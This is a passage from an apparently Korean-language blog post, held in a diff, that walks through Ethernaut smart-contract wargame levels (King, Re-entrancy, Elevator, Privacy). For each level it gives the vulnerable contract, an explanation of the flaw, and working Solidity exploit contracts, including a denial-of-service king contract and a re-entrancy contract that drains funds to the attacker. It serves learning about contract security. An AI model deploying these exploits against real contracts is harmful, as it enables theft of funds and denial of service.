+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#ae81ff">_</span><span style="color:#a6e22e">king</span>()
+<span style="color:#e6db74">&#39;0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">fromWei</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">prize</span>())
+<span style="color:#e6db74">&#39;0.001&#39;</span>
+</code></pre></div><h3 id="exploit-8">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-8">#</a></h3>
+<p><em><strong><a href="https://docs.soliditylang.org/en/v0.8.7/common-patterns.html#withdrawal-from-contracts">Solidity Withdrawal Pattern</a></strong> 참고</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">KingExploit</span> {
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> targetAddr) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        (<span style="color:#66d9ef">bool</span> result, ) <span style="color:#f92672">=</span> targetAddr.call.value(msg.value)(<span style="color:#e6db74">&#34;&#34;</span>);
+        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>result) revert(<span style="color:#e6db74">&#34;Failed to become a king..!&#34;</span>);
+    }
+
+    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+        revert(<span style="color:#e6db74">&#34;DoS&#34;</span>);
+    }
+}
+</code></pre></div><ul>
+<li>Deploy 후 exploit() 함수 호출 시, _kingAddr에 King 컨트랙트의 인스턴스 주소를 입력하고 msg.value는 0.001보다 큰 값(ex. 0.01, 0.002 등)을 입력한다.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>()
+<span style="color:#e6db74">&#39;0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#ae81ff">_</span><span style="color:#a6e22e">king</span>()
+<span style="color:#e6db74">&#39;0x2cfc9a56e5223f453ddFDd942Fa1B305b257650E&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">fromWei</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">prize</span>())
+<span style="color:#e6db74">&#39;0.002&#39;</span>
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-10-re-entrancy"># 10. Re-entrancy<a hidden class="anchor" aria-hidden="true" href="#-10-re-entrancy">#</a></h2>
+<h3 id="summary-9">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-9">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Reentrance</span> {
+  
+  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">public</span> balances;
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#66d9ef">address</span> _to) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+    balances[_to] <span style="color:#f92672">=</span> balances[_to].add(msg.value);
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _who) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance) {
+    <span style="color:#66d9ef">return</span> balances[_who];
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#66d9ef">uint</span> _amount) <span style="color:#66d9ef">public</span> {
+    <span style="color:#66d9ef">if</span>(balances[msg.sender] <span style="color:#f92672">&gt;=</span> _amount) {                       <span style="color:#75715e">// Check
+</span><span style="color:#75715e"></span>      (<span style="color:#66d9ef">bool</span> result,) <span style="color:#f92672">=</span> msg.sender.call{value<span style="color:#f92672">:</span>_amount}(<span style="color:#e6db74">&#34;&#34;</span>);      <span style="color:#75715e">// Interaction
+</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(result) {
+        _amount;
+      }
+      balances[msg.sender] <span style="color:#f92672">-=</span> _amount;                          <span style="color:#75715e">// Effects
+</span><span style="color:#75715e"></span>    }
+  }
+
+  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+}
+</code></pre></div><p>대상 컨트랙트가 가진 모든 자금을 가져오는 것이 목표이다.</p>
+<p>Checks-Effects Interfaction 패턴이 적용되지 않아 전형적인 Re-Entrancy 공격에 취약한 코드이다.</p>
+<p>이에 따라 공격자는 <code>fallback()</code>이나 <code>receive()</code> 등을 이용해 대상 컨트랙트의 <code>withdraw()</code>를 연속적으로 재호출할 수 있다.</p>
+<h3 id="exploit-9">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-9">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>)
+<span style="color:#e6db74">&#39;0.001&#39;</span>
+</code></pre></div><p>현재 컨트랙트가 가진 잔액은 0.001 ETH</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IReentrace</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#66d9ef">address</span> _to) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span>; 
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _who) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#66d9ef">uint</span> _amount) <span style="color:#66d9ef">external</span>;
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ReentranceExploit</span> {
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> reentranceAddr;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> attackerEOA;
+
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _reentranceAddr) <span style="color:#66d9ef">public</span> {
+        reentranceAddr <span style="color:#f92672">=</span> _reentranceAddr;
+        attackerEOA <span style="color:#f92672">=</span> msg.sender;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+        require(msg.value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+        IReentrace(reentranceAddr).donate.value(<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>)(<span style="color:#66d9ef">address</span>(this));
+        IReentrace(reentranceAddr).withdraw(<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getBalance</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">address</span>(this).balance;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTargetBalance</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>) {
+        <span style="color:#66d9ef">return</span> reentranceAddr.balance;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">self_destruct</span>() <span style="color:#66d9ef">external</span> {
+        require(msg.sender <span style="color:#f92672">==</span> attackerEOA);
+        selfdestruct(attackerEOA);
+    }
+
+    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+        <span style="color:#66d9ef">if</span> (reentranceAddr.balance <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>) {
+            IReentrace(reentranceAddr).withdraw(<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+        }
+    }
+}
+</code></pre></div><p>ReentranceExploit 컨트랙트의 <code>exploit()</code> 호출 시, 다음 공격 흐름이 Reentrance 컨트랙트의 잔고가 바닥이 날 때까지 반복된다.</p>
+<ul>
+<li>(1) ReentranceExploit 컨트랙트의 주소를 이용해 0.001 ETH <code>donate()</code>
+<ul>
+<li>Reentrance 컨트랙트의 <code>balances[ReentranceExploitAddress]</code> = 0.001 ETH</li>
+</ul>
+</li>
+<li>(2) <code>withdraw(0.001 ether)</code>를 호출하여 donation한 금액 출금 요청</li>
+<li>(3) ReentranceExploit 컨트랙트의 <code>receive()</code> 함수가 ETH를 수신하기 위해 호출됨</li>
+<li>(4) <code>receive()</code>에서 <code>withdraw()</code>를 다시 호출</li>
+</ul>
+<p>이후 <code>self_destruct()</code> 함수를 호출하여, 가져온 자금들을 공격자 EOA로 송금해주면 된다!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// ReentranceExploit Contract Deploy
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// exploit()
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>)
+<span style="color:#e6db74">&#39;0&#39;</span>
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-11-elevator"># 11. Elevator<a hidden class="anchor" aria-hidden="true" href="#-11-elevator">#</a></h2>
+<h3 id="summary-10">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-10">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Building</span> {
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+}
+
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Elevator</span> {
+  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> top;              <span style="color:#75715e">// false
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> floor;            <span style="color:#75715e">// 0
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#66d9ef">uint</span> _floor) <span style="color:#66d9ef">public</span> {
+    Building building <span style="color:#f92672">=</span> Building(msg.sender);
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> building.isLastFloor(_floor)) {
+      floor <span style="color:#f92672">=</span> _floor;
+      top <span style="color:#f92672">=</span> building.isLastFloor(floor);
+    }
+  }
+}
+</code></pre></div><p>bool 타입의 <code>top</code>을 <code>true</code>로 만드는 것이 목표이다.</p>
+<p>Elevator 컨트랙트는 goTo() 함수를 제공하며, 입력된 <code>_floor</code>를 <code>msg.sender</code>의 <code>isLastFloor()</code> 인터페이스에 전달하여 결과를 수신한다.</p>
+<h3 id="exploit-10">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-10">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IElevator</span> {
+    <span style="color:#75715e">// function
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#66d9ef">uint</span> _floor) <span style="color:#66d9ef">external</span>;
+
+    <span style="color:#75715e">// variable
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">floor</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>);
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ElevatorExploit</span> {
+    <span style="color:#66d9ef">address</span> targetAddr;
+    
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _targetAddr) <span style="color:#66d9ef">public</span> {
+        targetAddr <span style="color:#f92672">=</span> _targetAddr;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9ef">uint</span> _inputFloor) <span style="color:#66d9ef">external</span> {
+        IElevator(targetAddr).goTo(_inputFloor);
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#66d9ef">uint</span> _floor) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>){
+        <span style="color:#66d9ef">if</span>(IElevator(targetAddr).floor() <span style="color:#f92672">!=</span> _floor) {
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+        }
+        <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+        }
+    }
+}
+</code></pre></div><p>공격자가 입력한 층이 무조건 Last Floor 및 Top이 되도록 하는 isLastFloor() 인터페이스를 구현하면 된다.</p>
+<ul>
+<li>exploit() 함수에 공격자가 Top이 되도록 원하는 값을 입력</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">top</span>()
+<span style="color:#66d9ef">false</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">floor</span>()
+<span style="color:#a6e22e">o</span> {<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> Array(<span style="color:#ae81ff">2</span>), <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>}
+<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+<span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+<span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> (<span style="color:#ae81ff">2</span>) [<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">empty</span>]
+[[<span style="color:#a6e22e">Prototype</span>]]<span style="color:#f92672">:</span> Object
+
+<span style="color:#75715e">// exploit(50)
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">top</span>()
+<span style="color:#66d9ef">true</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">floor</span>()
+<span style="color:#a6e22e">o</span> {<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> Array(<span style="color:#ae81ff">2</span>), <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>}
+<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+<span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+<span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> (<span style="color:#ae81ff">2</span>) [<span style="color:#ae81ff">50</span>, <span style="color:#a6e22e">empty</span>]
+[[<span style="color:#a6e22e">Prototype</span>]]<span style="color:#f92672">:</span> Object
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-12-privacy"># 12. Privacy<a hidden class="anchor" aria-hidden="true" href="#-12-privacy">#</a></h2>
+<h3 id="summary-11">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-11">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Privacy</span> {
+
+  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> ID <span style="color:#f92672">=</span> block.timestamp;
+  <span style="color:#66d9ef">uint8</span> <span style="color:#66d9ef">private</span> flattening <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+  <span style="color:#66d9ef">uint8</span> <span style="color:#66d9ef">private</span> denomination <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>;
+  <span style="color:#66d9ef">uint16</span> <span style="color:#66d9ef">private</span> awkwardness <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint16</span>(now);
+  <span style="color:#66d9ef">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">private</span> data;
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">memory</span> _data) <span style="color:#66d9ef">public</span> {
+    data <span style="color:#f92672">=</span> _data;
+  }
+  
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#66d9ef">bytes16</span> _key) <span style="color:#66d9ef">public</span> {
+    require(_key <span style="color:#f92672">==</span> <span style="color:#66d9ef">bytes16</span>(data[<span style="color:#ae81ff">2</span>]));
+    locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+  }
+
+  <span style="color:#75715e">/*
+</span><span style="color:#75715e">    A bunch of super advanced solidity algorithms...
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
+</span><span style="color:#75715e">      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
+</span><span style="color:#75715e">      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
+</span><span style="color:#75715e">      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
+</span><span style="color:#75715e">      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
+</span><span style="color:#75715e">  */</span>
+}
+</code></pre></div><p><code>8. Vault</code> 문제와 같이 private으로 선언하더라도 storage 영역에 저장된 값은 확인이 가능하다.</p>
+<p>대상 컨트랙트의 bytes32[3] data fixed array의 마지막 요소인 data[2]에 저장되어 있는 키 값을 찾아야한다.</p>
+<p>Privacy 컨트랙트의 storage 영역의 값들은 다음과 같은 슬롯에 할당된다.</p>
+<pre tabindex="0"><code>bool public locked = true;                    // slot 0 : 1 bytes
+uint256 public ID = block.timestamp;          // slot 1 : 32 bytes
+uint8 private flattening = 10;                // slot 2 : 1 bytes
+uint8 private denomination = 255;             // slot 2 : 1 bytes
+uint16 private awkwardness = uint16(now);     // slot 2 : 2 bytes
+bytes32[3] private data;                      // slot 3 : data[0]
+                                              // slot 4 : data[1]
+                                              // slot 5 : data[2]
+</code></pre><h3 id="exploit-11">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-11">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">0</span>);
+<span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">1</span>);
+<span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000000000000000000000062011490&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">2</span>);
+<span style="color:#e6db74">&#39;0x000000000000000000000000000000000000000000000000000000001490ff0a&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">3</span>);
+<span style="color:#e6db74">&#39;0x3edd311ebeeb5f8c81ac1d7ded889b1dc76be556554cef0c35cdb8c4121fce96&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">4</span>);
+<span style="color:#e6db74">&#39;0xabaab090eedbeb41c34eebd1053d50f6d643142476fa67ba9ab668b8fff808c6&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">5</span>);     <span style="color:#75715e">// bytes32 data[2]
+</span><span style="color:#75715e"></span><span style="color:#e6db74">&#39;0x454b326e527ce34b20304b322983ab4030370380dfad9c0f1e40907c51851341&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">data2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">5</span>);
+<span style="color:#e6db74">&#39;0x454b326e527ce34b20304b322983ab4030370380dfad9c0f1e40907c51851341&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">data2_ascii</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">hexToAscii</span>(<span style="color:#a6e22e">data2</span>)
+<span style="color:#e6db74">&#39;EK2nR|ãK 0K2)\x83«@07\x03\x80ß­\x9C\x0F\x1E@\x90|Q\x85\x13A&#39;</span>
+
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">asciiToHex</span>(<span style="color:#a6e22e">data2_ascii</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">data2_ascii</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>))
+<span style="color:#e6db74">&#39;0x454b326e527ce34b20304b322983ab40&#39;</span>
+
+<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">key</span>)
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-13-gatekeeper-one"># 13. Gatekeeper One<a hidden class="anchor" aria-hidden="true" href="#-13-gatekeeper-one">#</a></h2>
+<h3 id="summary-12">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-12">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">GatekeeperOne</span> {
+
+  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> entrant;
+
